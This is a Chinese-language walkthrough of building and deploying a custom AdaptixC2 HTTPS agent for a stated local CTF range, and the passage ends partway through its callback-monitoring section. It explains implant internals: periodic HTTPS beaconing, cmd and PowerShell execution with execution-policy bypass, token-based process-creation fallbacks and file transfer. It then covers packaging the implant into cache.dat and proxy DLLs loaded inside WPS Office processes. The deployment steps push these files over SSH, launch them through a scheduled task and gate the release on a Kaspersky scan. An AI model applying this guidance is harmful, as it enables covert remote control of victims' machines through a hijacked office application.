# WPP/WPS direct_https Agent 从代码到构建、部署和回连的完整流程

本文面向刚接触 C++、Go、Windows 进程和 Agent 架构的读者，解释当前 `release-wpp-functional-v1` 是怎样从源码一步步变成靶机上运行的 WPP/WPS Agent。重点是“每一层负责什么、数据怎样流动、成功后怎样留下证据”。

本文对应的是本地 CTF 靶场中的固定版本：

- 源码仓库：`LOCAL_ADAPTIXC2_ROOT`
- 分支：`feature/direct-https-minimal-agent`
- release 提交：`72e54efee51ee70445344a81c4580142a505b0e2`
- release tag：`release-wpp-functional-v1`
- 最终包：`LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1`
- 完整结果：[RESULT.md](LOCAL_CANDIDATE_ROOT/RESULT.md)

先给一个最短结论：用户在 Adaptix Client 中输入一条命令，Client 通过 `ax_config.axs` 把命令交给 Go 插件；Go 插件把命令编码成任务帧；Windows Agent 在 WPP/WPS 进程中周期性发起 HTTPS check-in，取到任务后由 C++ `Commander` 执行；`JobsController` 收集输出并清理临时资源；结果重新编码、加密、回传，Go 插件解析后显示在界面中。

---

## 1. 先建立几个基本概念

### 1.1 Adaptix Client、Teamserver 和 Agent 的关系

可以把整个系统理解成三层：

| 名称 | 初学者理解 | 本项目中的职责 |
|---|---|---|
| Adaptix Client | 操作界面 | 选择会话、输入 `cmd`、查看结果 |
| Adaptix Teamserver | 中间服务器 | 保存任务、维护 listener、调用 Agent 插件 |
| Agent | 靶机上的运行组件 | 连接服务器、执行任务、回传结果 |

这里的 Agent 不是单独启动的普通命令行程序。当前验证目标是 WPP/WPS 宿主进程，因此 Agent 代码会通过 profile、loader 和 WPS proxy 制品进入 `wpp.exe` 或 `wps.exe` 的运行环境。

### 1.2 Listener 是什么

Listener 是 Teamserver 侧的网络监听入口。它负责等待 Agent 的 HTTPS 请求，并把请求交给对应的 Agent extender。当前 release 使用：

```text
listener: HTTPS_LISTENER
address: WINDOWS_TARGET_IP
port: 8443
method: POST
sleep: 10s
jitter: 0
```

这里的 `sleep: 10s` 表示 Agent 在正常工作状态下大约每 10 秒进行一次通信周期。`jitter: 0` 表示本轮验证采用固定周期，方便通过回连时间戳判断任务是否持续运行。

### 1.3 Profile、plugin 和 payload 的区别

这三个词很容易混淆：

| 名称 | 作用 | 当前对应文件 |
|---|---|---|
| Profile | 连接参数和协议参数 | `profile.bin`、profile DLL |
| Runtime plugin | Teamserver 识别和驱动 Agent 的 Go 插件 | `agent_direct_https.so` |
| Windows Agent | 在 WPP/WPS 内实际运行的 C++ 逻辑 | profile DLL 中的 Agent 代码 |
| cache | loader 读取的打包容器 | `cache.dat` |
| WPS proxy | 把 loader/profile 接入 WPS 宿主的 Windows DLL | `krpt.dll`、`krpt.agent.dll` |

一句话区分：`agent_direct_https.so` 主要在服务器侧，`cache.dat` 和两个 `krpt*.dll` 主要在靶机侧，profile DLL 是被打包进运行链的 Windows 代码载体。

### 1.4 Check-in、callback 和 task

- `check-in`：Agent 定期向 Teamserver 发请求，表示“我还活着，并且准备取任务”。
- `callback`：一次成功的 Agent 通信记录。在报告里通过 `a_last_tick` 的变化统计。
- `task`：Client 提交的一项具体工作，例如 `cmd echo HELLO`。
- `job`：Agent 内部正在运行的 Windows 子进程任务，例如一个仍在执行的 `cmd.exe`。

所以“进程还在”与“Agent 还在回连”是两个层次：前者看 Windows 进程，后者看 Teamserver 是否持续收到 callback。

---

## 2. 全链路总图

下面的图把一次 `cmd` 命令从输入到显示串起来：

~~~mermaid
flowchart LR
    A[Adaptix Client\n输入 cmd] --> B[ax_config.axs\n注册命令与参数]
    B --> C[Go 插件 pl_main.go\nCreateCommand]
    C --> D[任务编码\nLPT4 / schema4]
    D --> E[HTTPS Listener\nHTTPS_LISTENER]
    E --> F[WPP/WPS 中的 AgentMain]
    F --> G[ConnectorLite\nWinINet POST]
    G --> H[Commander.cpp\n解析 opcode]
    H --> I[cmd.exe 或 powershell.exe]
    I --> J[JobsController.cpp\n读取输出与收尾]
    J --> K[LPR4/native result\n结果编码]
    K --> E
    E --> L[Go ProcessData\n解码并更新任务]
    L --> M[Client 显示结果]
~~~

对于 `hello`、`pwd`、`disks` 等内部命令，步骤 I 会变成 Agent 自己执行的逻辑；对于 `upload`、`download`，步骤 I 会变成文件传输控制器。上层任务和下层回传仍沿用同一套任务生命周期。

---

## 3. 源码目录怎样阅读

先从这几个文件开始，阅读顺序比直接浏览整个仓库更容易建立概念：

| 文件 | 语言 | 先看什么 |
|---|---|---|
| [ax_config.axs](AdaptixServer/extenders/direct_https_agent/ax_config.axs) | Adaptix 脚本 | UI 里注册哪些命令 |
| [pl_main.go](AdaptixServer/extenders/direct_https_agent/pl_main.go) | Go | 命令怎样编码、结果怎样解析 |
| [pl_protocol_test.go](AdaptixServer/extenders/direct_https_agent/pl_protocol_test.go) | Go 测试 | 帧格式和边界怎样验证 |
| [MainAgent.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/MainAgent.cpp) | C++ | Agent 初始化与主循环 |
| [ConnectorHTTP.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/ConnectorHTTP.cpp) | C++ | HTTPS 连接怎样建立和收发 |
| [Commander.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/Commander.cpp) | C++ | command ID 怎样映射到 Windows 行为 |
| [JobsController.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/JobsController.cpp) | C++ | 进程任务怎样读取输出、结束和清理 |
| [utils.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/utils.cpp) | C++ | 管道、文件输出和编码转换 |
| [Makefile](AdaptixServer/extenders/direct_https_agent/Makefile) | Make | Go plugin 和 C++ 对象怎样组合 |
| [src_beacon/Makefile](AdaptixServer/extenders/direct_https_agent/src_beacon/Makefile) | Make | x64/x86 C++ 编译开关 |
| [scan-and-deploy.sh](LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1/scan-and-deploy.sh) | Bash | 停进程、备份、部署和扫描门禁 |

### 3.1 Go 文件与 C++ 文件如何配合

Go 侧更像“协议适配层”：它知道 Adaptix 的任务对象、命令 ID、参数类型和 UI 结果对象。C++ 侧更像“Windows 执行层”：它知道进程句柄、文件句柄、WinINet、Windows 编码和宿主环境。

中间的协议就是两边的合同：

```text
Go 侧：task ID + command ID + 参数
        <-> 编码帧 <->
C++ 侧：task ID + action ID + 参数
```

只要字段顺序、长度和字节序保持一致，Go 与 C++ 就能独立编译和测试。

---

## 4. 从 UI 命令到 Go 任务

### 4.1 UI 注册命令

打开 [ax_config.axs](AdaptixServer/extenders/direct_https_agent/ax_config.axs)，可以看到当前 v1 的功能面：

```text
hello
cmd
powershell
pwd
cd
ls
cat
mkdir
rm
cp
mv
disks
upload
download
```

例如：

```javascript
let cmd_cmd = ax.create_command(
    "cmd",
    "Execute a command through cmd.exe",
    "cmd whoami",
    "Task: execute cmd.exe command"
);
cmd_cmd.addArgString("command_line", true);
```

这段脚本完成三件事：

1. 给界面一个命令名称 `cmd`。
2. 告诉界面该命令需要一个字符串参数 `command_line`。
3. 给出默认示例 `cmd whoami`，便于操作员理解输入格式。

文件浏览器入口也在这个文件里注册：点击下载时执行 `download`，点击删除时执行 `rm`，浏览目录时执行 `ls`，上传时把本地文件和远程目标路径交给 `upload`。

### 4.2 Go 的 `CreateCommand`

文件：[pl_main.go](AdaptixServer/extenders/direct_https_agent/pl_main.go)

`CreateCommand` 是 UI 与底层 Agent 之间的第一道转换器。它接收到 Adaptix 的 command line 后，会：

1. 识别命令名字。
2. 分配或读取 task ID。
3. 按预定顺序读取参数。
4. 将参数转换成 Agent 能理解的字节串。
5. 选择兼容任务记录或 native task record。

以 `cmd echo FLOW_CMD` 为例，逻辑可以抽象成：

```text
用户文本：cmd echo FLOW_CMD
命令名称：cmd
参数：echo FLOW_CMD
command ID：COMMAND_PS_RUN
程序：cmd.exe
程序参数：/d /c echo FLOW_CMD
是否收集输出：是
```

PowerShell 走同一个进程任务类别，但程序和参数不同：

```text
命令名称：powershell
程序：powershell.exe
参数：-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command <用户命令>
```

这里的 `COMMAND_PS_RUN` 是现有 Adaptix 任务类型；`cmd` 与 `powershell` 通过不同的程序参数进入 Windows 执行层，因此 UI 仍然可以把两者显示成两个清晰的命令。

### 4.3 参数尾部为什么要处理 NUL

网络协议常常按 4 字节或 8 字节对齐。一个字符串结束后，打包器可能在字节数组尾部留下填充用的 `NUL`。对二进制结构来说，这个字节属于填充；对 Windows 命令行来说，它可能被误认为命令内容的一部分。

当前 Go 侧在生成 `cmd.exe` 或 PowerShell 参数前清理 packed 参数尾部，再把干净的文本交给 C++。这个处理能避免以下差异：

```text
预期：echo FLOW_CMD
风险：echo FLOW_CMD<NUL>
```

这类问题通常表现为命令启动了，但标记文本缺失或参数解析异常，因此在协议测试和真实靶机测试中都要覆盖。

---

## 5. 任务协议：数据怎样在网络上走

### 5.1 为什么要有 envelope

任务和结果都可能经历多个版本。直接把字段裸放进网络数据，服务端和 Agent 一旦版本不同就很难定位问题。因此当前实现给任务和结果增加了带 magic、schema、flags、长度和 section 的外壳。

可以把 envelope 想象成快递单：

| 字段 | 作用 |
|---|---|
| magic | 说明这是不是预期格式 |
| schema | 说明字段版本 |
| flags | 说明是否使用 section |
| body length | 告诉解析器正文有多长 |
| section | 说明正文采用哪种 codec |

### 5.2 当前重要格式名

| 名称 | 方向 | 初学者理解 |
|---|---|---|
| `DHB2` | Agent 到服务端 | heartbeat/check-in 外壳 |
| `DHT2` | 服务端到 Agent | task envelope |
| `DHR2` | Agent 到服务端 | result envelope 的兼容名称 |
| `LPT4` | 服务端到 Agent | 当前任务帧格式 |
| `LPR4` | Agent 到服务端 | 当前结果帧格式 |
| `schema4` | 双向 | 当前 section framing 版本 |
| `native result bundle V4` | Agent 到服务端 | 自研结果记录集合 |

这些名称来自 [pl_main.go](AdaptixServer/extenders/direct_https_agent/pl_main.go) 和 [MainAgent.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/MainAgent.cpp)。

### 5.3 能力协商

Agent 第一次 check-in 时携带能力信息，例如：

```text
beat schema
task envelope capability
result envelope capability
section envelope capability
native result capability
```

服务端根据能力选择任务发送格式。当前 Go 侧保留兼容 parser，C++ 侧也保留 legacy fallback，因此协议升级时可以先加入新格式，再保持旧格式解析入口。

### 5.4 任务方向的简化结构

任务方向可以画成：

```text
LPT4
├── schema
├── flags
├── task count
└── section body
    └── task record
        ├── task ID
        ├── action ID / command ID
        ├── argument count
        └── argument bytes
```

Go 中的 `packTaskSectionEnvelopeV3`、`packSelfC2TaskFrameV4` 和 `packTaskFrameWithMagic` 负责组装这层结构。

### 5.5 结果方向的简化结构

结果方向可以画成：

```text
LPR4
├── schema
├── flags
├── body length
└── sections
    ├── meta
    └── result bundle
        └── result record
            ├── task ID
            ├── action ID
            ├── field type
            ├── field length
            └── field bytes
```

`field type` 能区分普通文本、路径、文件列表、磁盘信息等结果。这样 `pwd` 的路径与 `cmd` 的文本可以共用一个结果框架，同时由 Go `ProcessData` 选择具体的 UI 展示方式。
---

## 6. Agent 启动与第一次回连

### 6.1 进入宿主后的第一步：加载 API

文件：[ApiLoader.h](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/ApiLoader.h)

Agent 通过 API 表保存 Windows 函数地址。初学者可以把 ApiWin 和 ApiNt 理解成两个函数目录：

- ApiWin：常用 Win32 API，例如文件、进程、内存和 WinINet 相关函数。
- ApiNt：更底层的 Windows Native API 声明和入口。

当前任务路径会用到的典型接口包括：

~~~text
CreateProcessA
CreateProcessAsUserA
CreateProcessWithTokenW
CreatePipe
CreateFileA
PeekNamedPipe
GetExitCodeProcess
WideCharToMultiByte
~~~

这样做的工程价值是：每个功能可以先检查 API 指针，再进入对应分支；诊断日志也能记录“API 已找到”“进程创建失败”等不同阶段。

### 6.2 读取配置和 profile

AgentConfig 读取编译时放入的 profile 数据。当前 profile 的关键内容来自 build-meta.json：

~~~json
{
  "listener": "HTTPS_LISTENER",
  "sleep": "10s",
  "jitter": 0,
  "beat_dialect": 2,
  "lazy_wininet_init": true,
  "lite_connector": true
}
~~~

profile 还包含：

- 服务器 WINDOWS_TARGET_IP:8443
- URI /api/v1/status、/updates/check.php、/content.html
- HTTP 方法 POST
- User-Agent
- heartbeat header X-Beacon-Id

### 6.3 MainAgent.cpp 的主入口

文件：[MainAgent.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/MainAgent.cpp)

AgentMain 可以拆成以下阶段：

1. 创建并初始化 API loader。
2. 创建 Agent、AgentConfig、Commander、JobsController。
3. 创建通信连接器。
4. 把 profile 和初始 heartbeat 数据交给连接器。
5. 发送第一次 check-in。
6. 等待响应或 sleep。
7. 解析任务并执行。
8. 读取正在运行的 job。
9. 打包结果并回传。
10. 清空本轮 packer，进入下一次 heartbeat。

主循环的核心逻辑可以简化成：

~~~cpp
for (;;) {
    connector->Exchange(outgoing, outgoingSize, sessionKey);
    if (connector->RecvSize() > 0) {
        commander->ProcessCommandTasks(connector->RecvData(), connector->RecvSize(), resultPacker);
    }
    jober->ProcessJobs(resultPacker);
    connector->Exchange(resultPacker->data(), resultPacker->datasize(), sessionKey);
    Sleep(nextHeartbeat);
}
~~~

实际代码还包含连接失败处理、任务为空时的心跳、结果 envelope 结束处理和资源释放。理解这段伪代码后，再读 1180 行附近的真实主循环会容易很多。

### 6.4 为什么当前使用 ConnectorLite

CreateConnector 根据编译开关选择 ConnectorLite 或普通 ConnectorHTTP。最终 release 使用：

~~~text
DIRECT_HTTPS_LITE_CONNECTOR=1
DIRECT_HTTPS_LAZY_HTTP_SEND=1
DIRECT_HTTPS_LAZY_WININET_INIT=1
~~~

ConnectorLite 的行为是：

1. 先保存 profile。
2. 延迟到第一次真正的 Exchange 时再加载 wininet.dll。
3. 通过 GetProcAddress 获取 InternetOpenA、InternetConnectA、HttpOpenRequestA、HttpSendRequestA 等 API。
4. 按 profile 选择服务器、URI 和 User-Agent。
5. 发起 HTTPS POST。
6. 读取服务端返回的加密字节。
7. 交给 MainAgent 解密和解析。

这里的“延迟初始化”是一个运行时初始化顺序设计：网络对象只在真正需要网络时创建，便于把初始化阶段、发送阶段、结果阶段分开观测。

---

## 7. 一条 cmd 命令在 C++ 中怎样执行

### 7.1 Commander 的职责

文件：[Commander.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/Commander.cpp)

Commander 是 C++ Agent 的任务分发器。它先读取 task record，再根据 action ID 选择：

~~~text
hello       -> 内部文本结果
pwd         -> 当前目录查询
disks       -> 逻辑磁盘查询
cmd         -> cmd.exe
powershell  -> powershell.exe
mkdir/rm... -> 文件 API
upload      -> Downloader/文件写入
download    -> 文件读取与分片回传
~~~

### 7.2 cmd.exe 参数构造

命令 cmd echo FLOW_CMD 最终对应：

~~~text
程序：cmd.exe
参数：/d /c echo FLOW_CMD
~~~

- /d：关闭 AutoRun 命令影响。
- /c：执行后面的字符串并退出。
- echo FLOW_CMD：用户提供的实际命令。

PowerShell 的实际参数是：

~~~text
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command <command>
~~~

这些参数由 Go 侧先按目标 ACP 编码，再由 C++ 侧交给 Windows 进程创建接口。

### 7.3 标准输出管道

普通路径的目标是：

~~~text
子进程 stdout/stderr
        -> 匿名管道
        -> Agent 读取端
        -> result packer
        -> Teamserver
~~~

因此 Commander 会先创建 stdout/stderr 管道，并设置子进程启动信息。JobsController 持有读取端和进程句柄，按周期读取新增内容。

### 7.4 主 WPP/WPS 环境中的进程创建链

主宿主环境会影响子进程创建时的 token、句柄继承和 job object 关系。当前 C++ 代码把多个创建方式串成一条可诊断的路径：

~~~text
普通 CreateProcessA
        |
        v
显式 handle list
        |
        v
breakaway 参数
        |
        v
CreateProcessAsUserA
        |
        v
CreateProcessWithTokenW
        |
        v
native process parameter 路径
        |
        v
shell/WMI 辅助路径
        |
        v
文件输出后备
~~~

这里每一层的目的都是让“子进程产生输出、Agent 取得输出、任务最终结束”这三个步骤在 WPP/WPS 主宿主环境中保持连贯。每次失败都会保留原始 Win32 错误码和内部诊断位，便于区分“创建失败”和“创建成功但输出读取失败”。

### 7.5 文件输出后备路径

当管道连接与宿主句柄条件不满足时，代码把 stdout/stderr 改成普通文件重定向：

~~~text
原始命令
    |
    v
原始命令 > "C:\Users\Public\direct-https-job-<taskId>.out" 2>&1
~~~

其中：

- > 把标准输出写入文件。
- 2>&1 把标准错误合并到同一个文件。
- <taskId> 让并发任务各自拥有唯一输出文件。

数据流变成：

~~~text
cmd.exe / powershell.exe
        -> direct-https-job-<taskId>.out
        -> JobsController::ReadDataFromAnonPipe(..., regularFile=TRUE)
        -> result packer
~~~

这个设计的关键点是：命令执行本身与输出传递方式分离。输出从“继承管道”切换为“文件读写”，任务协议和 Go 侧结果解析仍然复用原有路径。

---

## 8. JobsController 怎样管理任务生命周期

文件：[JobsController.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/JobsController.cpp)

### 8.1 Job 中保存哪些状态

一个进程 job 至少需要保存：

~~~text
task ID
command ID
进程句柄
读取管道句柄或输出文件路径
进程 PID
是否包含输出
已读输出缓存
进程退出状态
~~~

当前 CreateJobData 增加了 outputPath，它用于标记该任务是否走文件输出后备，并在任务结束时指向需要删除的临时文件。

### 8.2 周期读取

ProcessJobs 每一轮会：

1. 读取管道或普通文件中已有的数据。
2. 把新增字节追加到当前任务结果。
3. 查询进程退出码。
4. 判断任务是否仍在运行。
5. 对仍运行的任务保留 job。
6. 对已退出的任务进入最终收尾。

### 8.3 “文件为空”与“任务失败”是两个状态

文件后备刚建立时，文件可能暂时为空。此时进程仍在执行，正确行为是继续等待。

状态判断应当类似：

~~~text
文件为空 + 进程仍运行       -> 继续等待
文件有内容 + 进程仍运行     -> 读取并继续等待
进程已退出 + 文件有尾部内容 -> 最终读取一次
进程已退出 + 文件已读完     -> 结束并清理
~~~

当前实现把退出码初始状态设为 STILL_ACTIVE，并在进程退出后进行 final drain。这个 final drain 很重要，因为子进程退出前写入的最后一小段内容可能还停留在文件缓存或管道中。

### 8.4 资源收尾

任务完成或错误时按以下顺序处理：

~~~text
读取最后输出
    -> 关闭管道/文件句柄
    -> 关闭进程句柄
    -> 释放命令行缓冲区
    -> 删除 outputPath
    -> 打包完成或错误结果
~~~

真实回归的 cleanup 证据会查询：

~~~text
C:\Users\Public\direct-https-job-*.out
~~~

最终快照中该模式匹配数量为 0，说明任务临时文件的生命周期完整闭合。

---

## 9. PowerShell 输出为什么要单独处理

### 9.1 两种常见编码

cmd.exe 常见输出接近当前 OEM code page；Windows PowerShell 5.1 通过文件重定向时，常见结果是：

~~~text
UTF-16LE BOM：FF FE
后续内容：UTF-16LE 字符
~~~

如果把 UTF-16LE 字节直接当成单字节文本显示，界面上会出现乱码、空字节或标记匹配失败。

### 9.2 当前处理链

文件：[utils.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/utils.cpp)

当前逻辑是：

1. 读取输出文件或管道数据。
2. 检查开头是否为 FF FE。
3. 按 UTF-16LE 解释后续字符。
4. 调用 WideCharToMultiByte 转换到目标 OEM code page。
5. 把转换后的文本放回现有结果缓冲区。

所以测试中：

~~~text
powershell Write-Output F0N_WPP_PS
~~~

最终能够显示为普通的 F0N_WPP_PS，并通过 marker 匹配。

### 9.3 这类问题怎样排查

看到 PowerShell 任务完成但文本为空时，按下面顺序检查：

1. Commander.cpp 里 PowerShell 命令行是否完整。
2. JobsController 是否读取到输出长度。
3. 输出前两个字节是否是 FF FE。
4. WideCharToMultiByte 是否拿到正确 code page。
5. Go ProcessData 是否把结果按 agentData.OemCP 转成 UTF-8。

---

## 10. 结果怎样回到 Adaptix Client

### 10.1 C++ 侧打包

MainAgent.cpp 中的结果 envelope 会写入：

~~~text
LPR4
schema
flags
body length
meta section
result bundle section
~~~

每条 result record 包含：

~~~text
task ID
action ID
field type
field length
field bytes
~~~

field bytes 可以是 hello 文本、pwd 路径、ls 列表、disks 的盘符数组或文件传输状态。

### 10.2 Go 侧解包

文件：[pl_main.go](AdaptixServer/extenders/direct_https_agent/pl_main.go)

ProcessData 的处理顺序是：

1. 解密 HTTP 响应体。
2. 识别 LPR4 或兼容结果头。
3. 检查 schema、flags 和 body length。
4. 遍历 section。
5. 识别 native result bundle 或兼容 result body。
6. 读取 task ID 和 command ID。
7. 根据 command ID 解析剩余字段。
8. 更新 Adaptix task 的文本、状态、消息和文件对象。

### 10.3 COMMAND_ERROR 的错误布局

错误结果继续使用已有三字段布局，典型内容是：

~~~text
success/result flag
Win32 error code
diagnostic flags 或附加错误字段
~~~

这样服务端界面仍按原有完成/错误语义工作；较细的创建路径、原始错误码和诊断位写入 JSON 证据，便于工程排查。

### 10.4 为什么要保留 legacy parser

协议测试覆盖 native 和 legacy 两种结果。兼容 parser 的工程意义是：

- 旧 Agent 结果仍然可以解析。
- 新 Agent 可以逐步启用 native result。
- 解析错误能通过 magic、schema、长度检查快速定位。
- 单个命令增加新字段时，其他命令仍按已有布局运行。

---

## 11. 构建流程：源码怎样变成发布包

### 11.1 构建前检查

源码根目录：

~~~bash
cd LOCAL_ADAPTIXC2_ROOT
git status --short
git rev-parse HEAD
git diff --check
~~~

release 版本应看到：

~~~text
HEAD = 72e54efee51ee70445344a81c4580142a505b0e2
tag  = release-wpp-functional-v1
~~~

构建前记录提交号的原因是：同名 cache.dat 或同名 DLL 只说明文件名一致，提交号和 SHA-256 才能说明代码与制品的对应关系。

### 11.2 Go 测试

本轮使用隔离的 Go 1.25.4 工具链：

~~~bash
/tmp/go-toolchain-1.25.4/bin/go version

cd AdaptixServer/extenders/direct_https_agent
/tmp/go-toolchain-1.25.4/bin/go test ./...
~~~

测试重点是：

- capability 协商。
- heartbeat 和 task envelope。
- LPT4/schema4 section framing。
- native task record。
- LPR4 result bundle。
- legacy result parser。
- disks 的返回结构。
- 字节长度、截断和多余尾部处理。

AdaptixServer 根 module 另有既存的 vet 诊断，完整原始日志保存在 build-logs/go-test-AdaptixServer-1.25.4.log；使用 go test -vet=off ./... 的工程测试通过。direct_https_agent module 的 go test ./... 通过。

### 11.3 Go plugin 构建

文件：[direct_https_agent/Makefile](AdaptixServer/extenders/direct_https_agent/Makefile)

Go plugin 的核心构建形式是：

~~~bash
GOEXPERIMENT=jsonv2,greenteagc \
go build -buildmode=plugin -ldflags="-s -w" \
  -o ./dist/agent_direct_https.so \
  pl_main.go pl_packer.go pl_utils.go
~~~

生成的 agent_direct_https.so 由 Teamserver 加载。它不是靶机上的 Windows DLL，而是服务器端的 Go extender；它让 Teamserver 认识 direct_https 这个 Agent，以及命令和结果格式。

### 11.4 C++ x64/x86 对象构建

文件：[src_beacon/Makefile](AdaptixServer/extenders/direct_https_agent/src_beacon/Makefile)

C++ 源码通过 MinGW 交叉编译器生成两个架构的对象：

~~~text
x86_64-w64-mingw32-g++ -> x64 objects
i686-w64-mingw32-g++   -> x86 objects
~~~

参与链接的模块包括：

~~~text
Agent
AgentConfig
AgentInfo
ApiLoader
Commander
ConnectorHTTP
Crypt
Downloader
Encoders
JobsController
MainAgent
MemorySaver
Packer
ProcLoader
WaitMask
crt
std
utils
~~~

最终 release 的关键编译开关是：

~~~text
DIRECT_HTTPS_LAZY_HTTP_SEND=1
DIRECT_HTTPS_LAZY_WININET_INIT=1
DIRECT_HTTPS_LITE_CONNECTOR=1
DIRECT_HTTPS_NO_API_HASHING=1
DIRECT_HTTPS_BEAT_DIALECT=2
~~~

完整构建命令保存在：[profile-build-ps-encoding.log](LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1/build-logs/profile-build-ps-encoding.log)。

### 11.5 profile DLL 构建

profile DLL 由 C++ Agent 对象、配置对象和入口文件链接得到。构建日志中的关键步骤是：

~~~text
config.cpp
Agent/*.cpp
direct HTTPS Agent 对象
direct_https_dll_entry.cpp
        -> direct_https_profile.x64.dll
~~~

profile DLL 中包含运行时需要的 profile/config 入口和 RunAgentDll 相关入口，随后进入 profile 的容器转换步骤：

~~~text
direct_https_profile.x64.dll
        -> profile XOR/container
        -> direct_https_profile.x64.bin
~~~

profile.bin 是 275 字节的 profile payload，里面包含 listener 名称、目标地址、URI、sleep、jitter 和加密参数等配置数据。

### 11.6 cache.dat 打包

cache 打包日志使用 DHPL1 格式记录 profile image 的元数据，包括：

- PE section 数量。
- relocation 数量。
- import 数量。
- TLS callback 数量。
- 入口点 RVA。
- Agent 运行入口 RVA。
- plain image 大小和 SHA-256。

打包结果是：

~~~text
profile image
    -> DHPL1 cache container
    -> cache.dat
~~~

最终 cache.dat 大小为 79,896 字节，SHA-256 为：

~~~text
5c89811ade759d5c1c6cc25f153357931f66320160da63e77c055c7d2193961b
~~~

### 11.7 WPS proxy 制品

WPS proxy 构建阶段生成：

~~~text
krpt.dll
krpt.agent.dll
~~~

两个文件当前大小都为 50,688 字节，SHA-256 都是：

~~~text
b4bb6f1171cb80e9514c767110a3bb68c7e9a3688b9887f423d0fceb1cc46bac
~~~

它们属于宿主接入链路；cache.dat 提供被 loader 读取的 Agent/profile 内容，proxy DLL 负责把这条加载链带入 WPP/WPS 运行环境。

### 11.8 发布目录和完整性清单

最终目录：[release-wpp-functional-v1](LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1/MANIFEST.md)

主要文件：

~~~text
cache.dat
krpt.dll
krpt.agent.dll
agent_direct_https.so
profile_dll/direct_https_profile.x64.dll
profile_dll/direct_https_profile.x64.bin
profile_dll/profile.bin
profile_dll/build-meta.json
scan-and-deploy.sh
release-callback-monitor.py
SHA256SUMS
build-logs/*
~~~

发布前执行：

~~~bash
cd LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1
sha256sum -c SHA256SUMS
~~~

SHA256SUMS 通过后，说明当前目录中的文件内容与构建时记录一致。

---

## 12. 部署流程：发布包怎样进入靶机

### 12.1 发布脚本的固定变量

文件：[scan-and-deploy.sh](LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1/scan-and-deploy.sh)

脚本使用本地 SSH helper 连接 Windows 靶机，并使用 PowerShell 执行远程动作。关键变量包括：

~~~text
远程 WPS 目录：C:\Users\LAB_USER\AppData\Local\Kingsoft\WPS Office\12.1.0.26886\office6
任务名称：WPP_ActiveV2_Live_Test_Limited
Kaspersky CLI：C:\Program Files (x86)\Kaspersky Lab\Kaspersky 21.25\avp.com
~~~

### 12.2 停止旧实例和备份

部署开始时：

1. 停止当前 wpp.exe 与 wps.exe。
2. 等待文件句柄释放。
3. 给远程 cache.dat、krpt.dll、krpt.agent.dll 添加带时间戳的 .before-<timestamp> 备份。

备份的价值是让本轮候选与上一轮运行文件可区分，也方便失败阶段保留现场。

### 12.3 文件传输

部署脚本的 deploy_file 采用分块传输：

~~~text
本地文件
    -> Base64
    -> 每块约 2048 字节
    -> SSH/PowerShell 传到靶机
    -> 远程拼接 Base64
    -> Convert.FromBase64String
    -> WriteAllBytes
~~~

这条链路适合当前靶场的 SSH/PowerShell 通道。每个文件写入后，脚本在靶机执行 Get-FileHash，把远程哈希写入 deployed-hashes.txt。

检查原则是：

~~~text
本地 SHA-256 == 远程 SHA-256
~~~

两边一致才进入扫描和启动阶段。

### 12.4 写入的三个核心文件

当前部署阶段重点覆盖：

~~~text
cache.dat
krpt.dll
krpt.agent.dll
~~~

服务器侧的 agent_direct_https.so 和 profile 构建文件留在 Teamserver/构建目录；靶机侧按 WPS 运行链读取 cache 和 proxy 制品。

### 12.5 启动 WPP/WPS

部署完成后，脚本启动计划任务：

~~~text
WPP_ActiveV2_Live_Test_Limited
~~~

启动后观察两类证据：

- Windows 进程列表中出现 wpp.exe、wps.exe。
- Teamserver /agent/list 中出现 a_name=direct_https、a_listener=HTTPS_LISTENER 的 Agent。

---

## 13. 靶机回连的完整时间线

下面按时间顺序说明一次新部署：

### T0：WPP/WPS 进程启动

WPP/WPS 加载 proxy 和 cache。Agent 进入 AgentMain，初始化 API、配置、命令器、任务管理器和连接器。

### T1：读取 profile

Agent 得到服务器地址、端口、URI、HTTP 方法、User-Agent、heartbeat header、sleep 和 jitter。

### T2：第一次 HTTPS check-in

ConnectorLite 第一次真正的 Exchange 时加载 WinINet，按 profile 建立 HTTPS 请求，把 heartbeat 和能力信息发送给 HTTPS_LISTENER。

### T3：Teamserver 登记 Agent

Teamserver 解析 heartbeat，生成或更新 Agent 记录。回连监视器筛选：

~~~text
a_name     == direct_https
a_listener == HTTPS_LISTENER
a_process  == wpp.exe 或 wps.exe
创建时间    >= 本轮开始时间附近
~~~

### T4：后续心跳

每个 10 秒左右，Agent 发起下一次通信。服务端如果没有任务，返回心跳；如果有任务，返回任务帧。

### T5：取到任务

Agent 解密响应，识别 DHT2/LPT4 或兼容格式，交给 Commander。

### T6：执行任务

Commander 根据 action ID 执行内部能力、Windows 子进程或文件传输。需要输出时创建管道，并在宿主条件下进入文件输出后备。

### T7：回传结果

JobsController 读取结果，进行最后一次 drain，关闭句柄，删除临时输出文件。MainAgent 打包 LPR4，Connector 通过下一次 HTTPS POST 发送。

### T8：界面更新

Go ProcessData 解析 task ID 和 command ID，把 a_text、a_message、完成状态和文件对象回写到 Adaptix Client。

---

## 14. 回连监视器怎样判断稳定

文件：[release-callback-monitor.py](LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1/release-callback-monitor.py)

### 14.1 监视参数

最终 release 使用：

~~~text
duration: 720 秒
interval: 10 秒
minimum callbacks per process: 6
processes: wpp.exe, wps.exe
listener: HTTPS_LISTENER
~~~

### 14.2 每轮查询内容

监视器登录 Teamserver API 后，周期性请求 /agent/list，为每个进程保存：

~~~text
agent_id
PID
a_process
a_create_time
a_last_tick
sleep
jitter
~~~

